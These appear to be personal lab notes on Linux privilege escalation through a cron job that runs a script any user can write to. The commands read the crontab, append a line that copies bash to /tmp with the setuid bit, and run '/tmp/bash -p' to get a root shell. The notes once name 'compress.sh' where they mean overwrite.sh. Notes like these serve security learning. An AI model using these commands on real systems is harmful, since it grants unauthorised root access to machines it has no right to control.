This happens when we are able to write on the files executed by the `cron`.

In this case we can see:
```bash
cat /etc/crontab
```
- ![[Pasted image 20250117162625.png]]

So we locate the file:
```bash
locate overwrite.sh
```
- ![[Pasted image 20250117162847.png]]


And if we check the permissions over `compress.sh`:
```bash
ls -la /usr/local/bin/overwrite.sh
```
- ![[Pasted image 20250117162717.png]]
- we can notice we have `read` and `write` permission on that file, so we can modify it


In that case we just need to write on this file:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```


At this point the system will create a `bash` binary on `/tmp`:
- ![[Pasted image 20250117163038.png]]


We run it:
```bash
/tmp/bash -p
```
- ![[Pasted image 20250117163101.png]]


<mark style="background: #BBFABBA6;">We gain a root shell!</mark>
